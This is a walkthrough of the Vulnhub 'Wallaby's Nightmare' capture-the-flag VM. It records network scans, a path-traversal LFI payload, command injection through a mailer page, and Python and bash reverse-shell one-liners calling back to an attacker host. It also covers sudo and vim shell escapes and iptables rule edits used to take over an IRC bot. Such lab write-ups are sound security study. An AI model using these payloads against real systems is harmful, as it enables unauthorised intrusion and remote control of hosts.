## Vulnhub Wallaby's Nightmare 1

<!-- TOC -->

- [Vulnhub Wallaby's Nightmare 1](#vulnhub-wallabys-nightmare-1)
    - [YouTube Stream](#youtube-stream)
    - [Follow Ups](#follow-ups)
    - [VM TODO](#vm-todo)
    - [NOTES](#notes)
    - [NETWORK DISCOVERY](#network-discovery)
    - [METASPLOIT WORK](#metasploit-work)
    - [MESSAGES AND HINTS](#messages-and-hints)
    - [SERVICES AND VULNS](#services-and-vulns)
    - [WEB VECTORS](#web-vectors)
    - [DIRBUSTER](#dirbuster)
    - [IRC PATH](#irc-path)
    - [KERNEL Privesc PATH (incomplete until I have a chance to come back to this)](#kernel-privesc-path-incomplete-until-i-have-a-chance-to-come-back-to-this)
    - [IPTABLES NOTES](#iptables-notes)

<!-- /TOC -->

### YouTube Stream

[https://www.youtube.com/watch?v=DODDOn2JkZo](https://www.youtube.com/watch?v=DODDOn2JkZo)

### Follow Ups

* [ ] Web injection from cli with curl, python, etc...
* [x] Need to look into web discovery and fuzzing tools - prefer a pure cli alternative
* [x] Dirb as a web discovery/fuzzing tool - only does list based discovery, no spidering, no http req/res shown, no fuzzing
* [x] Dirbuster - discovers content and returns request results, allowing you to find vulnerabilities in the responses, but, i didn’t see a way to sort on response size (in KB), which is really handy when trying to find unique responses that may suggest vulns.  Also Dirbuster docs suggest it’s deprecated by OWASP ZAP
* [x] OWASP ZAP - it’s big and heavy - hung when discovering content from a word list
* [x] Burp - free edition doesn’t have content discovery, but the fuzzing is good - still big and clunky UI 

### VM TODO

* [x] apache version looks solid enough cvedetails.com
* [x] look more into sshd vuln - only easy to find exploit is user enumeration - https://www.exploit-db.com/search/?action=search&q=OpenSSH+7.2p2&g-recaptcha-response=03AOP2lf5c3L8VShKLVseQceP-EppI8xpaiG3oUKcfmdTWs_klcfLfPtx_yOiqMFXpqiRum4ajII5w_l84WFvOPbWOpfuMsxykmbbAyH4r3ADFhKEVbSTQq2TuEp1dAnKYCGAtqIHzBjW8bZd0-QBRNa3A-S0Vs9KlTfj-gS25nJRUreoGiTVr2hHURC2HGRvIZWefLYICPw0lRHU7QmU-KS338UPfKnmZTUhsxtJhsAgkw1B2LeoelHbmNkuKdiXUIp-goYzsgrw04nAPvXFlgGx8l9bdpv1CRsH0BH8ZBAIN4gMzL__47bycftYNSNPYTazpYqWylhfP

* [ ] how to check dhcpd version
* [x] probably going to be some web app vector
* [x] dirb
* [x] what’s the difference between dirb and dirbuster
* [x] dirbuster will have an rce in one of the findings
* [x] get a reverse shell from pentestmonkey - they python rce works
* [x] once you have shell as httpd user check sudo -l
* [x]     should be able to run iptables to flush and get access to IRC (which is filtered (see port scan))
* [x]     i think also can vi some stuff… double-check this
* [ ] kernel is vulnerable to an privesc — check cowroot exploit — https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
* [x] IRC 

### NOTES

the openssh vuln may be used for privesc.  a hint was given “your environment matters”
OpenSSH 7.2p2 has an interesting CVE — “allows local users to gain privs by triggering a crafted environment for /bin/login


### NETWORK DISCOVERY

Sweeping no-ping scan of subnet to find target
```
nmap -Pn 192.168.86.0/24

Nmap scan report for 192.168.86.140
Host is up (0.00036s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
6667/tcp filtered irc
MAC Address: 00:0C:29:88:9A:34 (VMware)
```
TCP Syn Scan with light service detection
```
root@kali:~/wallaby# nmap -sS 192.168.86.140 -p- -oA outputfile.out -v -sV --version-intensity 2
(output in services section below)
```
UDP Scan
```
nmap 192.168.86.140 -sU -oA udpscan.out
```

nmap with vuln scripts: (this is crap)
```
nmap -sS 192.168.86.140 -p- -oA outputfile.out -v -sV --script vuln
```

### METASPLOIT WORK

```
msfconsole
msf > workspace wallaby
msf > db_import ~/wallaby/*xml  (imports our nmap scans)
```

### MESSAGES AND HINTS

> Welcome to the Wallaby's Worst Knightmare 2 part series VM.
> A few tips.
> 1. Fuzzing is your friend.
> 2. Tmux can be useful for many things.
> 3. Your environment matters.
> Good luck and have fun! -Waldo

### SERVICES AND VULNS

```
host            port   proto  name   state     info
----            ----   -----  ----   -----     ----
192.168.86.140  22     tcp    ssh    open      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 Ubuntu Linux; protocol 2.0
192.168.86.140  68     udp    dhcpc  unknown
192.168.86.140  80     tcp    http   open      Apache httpd 2.4.18 (Ubuntu)
192.168.86.140  6667   tcp    irc    filtered
192.168.86.140  60080  tcp    http   open      Apache httpd 2.4.18 (Ubuntu)
```

OpenSSH 7.2p2 has an interesting CVE — “allows local users to gain privs by triggering a crafted environment for /bin/login
https://www.cvedetails.com/cve/CVE-2015-8325/
The do_setup_env function in session.c in sshd in OpenSSH through 7.2p2, when the UseLogin feature is enabled and PAM is configured to read .pam_environment files in user home directories, allows local users to gain privileges by triggering a crafted environment for the /bin/login program, as demonstrated by an LD_PRELOAD environment variable.
Publish Date : 2016-04-30 Last Update Date : 2016-11-30

### WEB VECTORS

LFI at 1st level of difficulty
http://192.168.86.142/?page=../../../../../etc/passwd

```
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
syslog:x:104:108::/home/syslog:/bin/false 
_apt:x:105:65534::/nonexistent:/bin/false 
uuidd:x:107:111::/run/uuidd:/bin/false 
walfin:x:1000:1000:walfin,,,:/home/walfin:/bin/bash 
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin 
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false 
steven?:x:1001:1001::/home/steven?:/bin/bash 
ircd:x:1003:1003:,,,:/home/ircd:/bin/bash
```

on second LFI attempt, the VM locks shuts down the website on port 80
fresh portscan on all ports (-p- option)
will reveal the web server is now listening on 60080

with this page:
not sure what the form post does...
```html
HTTP/1.1 200 OK
Date: Sat, 15 Apr 2017 22:25:35 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1145
Connection: close
Content-Type: text/html; charset=UTF-8
<title>Wallaby's Server</title>
<script>function post(path, params, method) {
    method = method || "post"; // Set method to post by default if not specified.

    // The rest of this code assumes you are not using a library.
    // It can be made less wordy if you use one.
    var form = document.createElement("form");
    form.setAttribute("method", method);
    form.setAttribute("action", path);

    for(var key in params) {
        if(params.hasOwnProperty(key)) {
            var hiddenField = document.createElement("input");
            hiddenField.setAttribute("type", "hidden");
            hiddenField.setAttribute("name", key);
            hiddenField.setAttribute("value", params[key]);

            form.appendChild(hiddenField);
         }
    }

    document.body.appendChild(form);
    form.submit();
}
</script>


    <p style="text-align:center;">HOLY MOLY, this guy <em>hiway
</em>wants me...Glad I moved to a different port so I could work more securely!!!</p>
    <br /><p style="text-align:center;">As we all know, <strong><em>security by obscurity</em></strong> is the way to go...<br />
    <img src="/sec.png"/></p>
```

There’s a javascript form `POST` defined in that page.
here’s a stub for a POST request that might be modified 
```http
POST / HTTP/1.1
Host: 192.168.86.142:60080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
name=value&name=value
```

###DIRBUSTER

target url <http://192.168.86.142:60080>
autoswitch (HEAD and GET)
List Brute force using `/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt$
URL to fuzz - /index.php?page={dir}`

In one of the responses, a command injection can be found:
the mailer page has a mail function that performs an os command.
`mail` is the command shown below, with the arguments being the user to mail, and the message,
but any command on the system can be substituted...

```html
<h2 style='color:blue;'>Coming Soon guys!</h2>
    <!--a href='/?page=mailer&mail=mail wallaby "message goes here"'><button type='button'>Sendmail</button-->
    <!--Better finish implementing this so hiway
 can send me all his loser complaints!—>
```

so we’ll try to inject a reverse-shell

first, set up a listener on your local machine
```
root@kali:~/wallaby# nc -l -p 1234
```

grab some reverse shell samples from pentestmonkey (python sample works) 
<http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>

browser url, with the reverse shell injection substituted for the `mail` command:
combine these two lines --
```
http://192.168.86.140:60080/?page=mailer&mail=
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.86.141",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
check what we can do with `sudo`
```
$ sudo -l
```
```
Matching Defaults entries for www-data on ubuntu:  
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
    (ALL) NOPASSWD: /sbin/iptables
```
```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -a
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```
now with shell, you can go a few routes:

### IRC PATH
find the iptables filter on 6667 (IRC) 
```
$ sudo iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     tcp  --  localhost            anywhere             tcp dpt:ircd
2    DROP       tcp  --  anywhere             anywhere             tcp dpt:ircd

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination  
```

delete the DROP rule that filters the IRC port
```
$ sudo iptables -D INPUT 2
```
find ircd version to look for a cve/exploit. turns out to be easy to find
```
$ ps aux |grep irc
ircd        839  0.0  0.2  19928  4636 ?        S    13:19   0:00 /home/ircd/Unreal3.2.10.4/src/ircd
```
don’t really see an irc exploit worth using
<https://www.cvedetails.com/product/19595/Unrealircd-Unrealircd.html?vendor_id=10938>

connect to IRC server (using weechat here and i’ve already defined an IRC server profile called wallabys)
```
/connect wallabys
/list shows a channel #wallabyschat
/join #wallabyschat
```
users in here are  
waldo  
@wallabysbot  

figure the bot is going to give us our next step.  After trying a bunch of random chat at the bot, I went back to the filesystem to look for some configuration
```
$ find /home
```
* the /ircd/unreal` stuff is irc service software and config  
* the /waldo and /wallaby irssi stuff is an IRC client config  
* /home/waldo has a tmux startup script that starts the irc client and connects to the IRC server as /nick waldo
* stuff in /home/wallaby/.sopel looks relevant to the IRC bot
```
$ pwd
/home/wallaby/.sopel
$ file *
default.cfg:                   ASCII text
default.db:                    SQLite 3.x database
logs:                          directory
malwaredomains.txt:            ASCII text
modules:                       directory
sopel.pid:                     ASCII text, with no line terminators
wallabysbot-127.0.0.1.tell.db: empty
$
``` 

don’t know much about IRC bots, but googling sopel+irc turns up plenty of info if more research is needed on the bot

in the modules directory, the `run.py` script indicates that one of the bot commands is .run and that the id of the caller is checked  
this is confirmed in the IRC session:
```
11:05:23  root | .run id
11:05:25 wallabysbot | Hold on, you aren't Waldo?
/nick waldo  - gives an error because waldo is already logged in via a local irc client.
```

The designed route is to use sudo/vi to get shell.  Instead I tried to get waldo out so I could assume his nickname:

try blocking traffic to ircd until irc sessions time out
add an iptables rule, wait for irc sessions to timeout, then remove the blocking rule to ircd and see if you can connect and take the waldo nick
this works, but unfortunately the irc bot (sopel bot) times out and never reconnects.  the bot service is started by /etc/init.d/sopel

so at this point i’m kind of stuck on the IRC path, and i want to restart the VM.  
so I used the other allowable sudo command, vi, to move the tmux irc startup script in waldo’s home directory
```
User www-data may run the following commands on ubuntu:
    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
    (ALL) NOPASSWD: /sbin/iptables

sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
```
`:!mv ~/irssi.sh ~/irssi.sh_`   (at this point it’s easier to just use vi to execute a shell as waldo, then join waldo’s tmux/irc session, but i wanted to follow through on my attempt to kick waldo out of IRC for the takeover.)  
`:q!`

Then i crashed/restarted the VM.  
When it boots back up, you have to re-remove the IRC blocking iptables rule then you can connect to IRC and `/nick waldo`  
The bot is started, and as waldo you are authorized to use `.run`

from here, run another reverse shell, this will run as the ircbot process owner (wallaby)
```
.run bash -c “bash -i >& /dev/tcp/192.168.86.141/8080 0>&1"
```
I needed help from abatchy’s writeup to get this syntax <http://www.abatchy.com/2017/01/wallabys-nightmare-walkthrough-vulnhub.html>

as waldo, `sudo -l` finds that you effectively have root.
grab the flag from /root directory and done


### KERNEL Privesc PATH (incomplete until I have a chance to come back to this)
```
$ uname -a
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
$ cat /proc/version
Linux version 4.4.0-31-generic (buildd@lgw01-16) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2.1) ) #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016
```

vulnerable to dirtycow

### IPTABLES NOTES
```
www-data@ubuntu:/var/www/html$ sudo iptables -L -n -v  
sudo iptables -L -n -v
Chain INPUT (policy ACCEPT 10428 packets, 820K bytes)
 pkts bytes target     prot opt in     out     source               destination         
 8047  514K ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:6667

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 49845 packets, 5245K bytes)
 pkts bytes target     prot opt in     out     source               destination         
```
```
www-data@ubuntu:/var/www/html$ sudo iptables -A INPUT -p tcp --dport 6667 -j DROP
<ml$ sudo iptables -A INPUT -p tcp --dport 6667 -j DROP
```
```
www-data@ubuntu:/var/www/html$ sudo iptables -L -v -n 
sudo iptables -L -v -n 
Chain INPUT (policy ACCEPT 9 packets, 564 bytes)
 pkts bytes target     prot opt in     out     source               destination         
 8093  517K ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:6667
    0     0 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:6667

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 19 packets, 1464 bytes)
 pkts bytes target     prot opt in     out     source               destination      
```
now wait for your own IRC client to timeout and maybe an extra minute…  
then remove the DENY IRC Rule
```
www-data@ubuntu:/var/www/html$ sudo iptables -L --line-numbers
sudo iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     tcp  --  localhost            anywhere             tcp dpt:ircd
2    DROP       tcp  --  anywhere             anywhere             tcp dpt:ircd

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
www-data@ubuntu:/var/www/html$ sudo iptables -D INPUT 2
sudo iptables -D INPUT 2
```
```
www-data@ubuntu:/var/www/html$ sudo iptables -L -v -n
sudo iptables -L -v -n
Chain INPUT (policy ACCEPT 31 packets, 2162 bytes)
 pkts bytes target     prot opt in     out     source               destination         
 8211  524K ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:6667

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 102 packets, 8958 bytes)
 pkts bytes target     prot opt in     out     source               destination         
```
```
www-data@ubuntu:/var/www/html$ sudo iptables -A INPUT -s 127.0.0.1 -p tcp --dport 6667 -j DROP
<ml$ sudo iptables -A INPUT -s 127.0.0.1 -p tcp --dport 6667 -j DROP   
```
```
www-data@ubuntu:/var/www/html$ sudo iptables -I INPUT -s 192.168.86.141 -p tcp --dport 6667 -j ACCEPT
<ml$ sudo iptables -I INPUT -s 192.168.86.141 -p tcp --dport 6667 -j ACCEPT  
```
```
www-data@ubuntu:/var/www/html$ sudo iptables -L -v -n
sudo iptables -L -v -n
Chain INPUT (policy ACCEPT 3 packets, 179 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     tcp  --  *      *       192.168.86.141       0.0.0.0/0            tcp dpt:6667
 8393  536K ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:6667
    0     0 DROP       tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:6667

```
```      
www-data@ubuntu:/var/www/html$ sudo iptables -D INPUT 2
sudo iptables -D INPUT 2
www-data@ubuntu:/var/www/html$ sudo iptables -L --line-numbers
sudo iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     tcp  --  192.168.86.141       anywhere             tcp dpt:ircd
2    DROP       tcp  --  localhost            anywhere             tcp dpt:ircd
```

then try connecting to the server then /nick waldo  then /join the channel



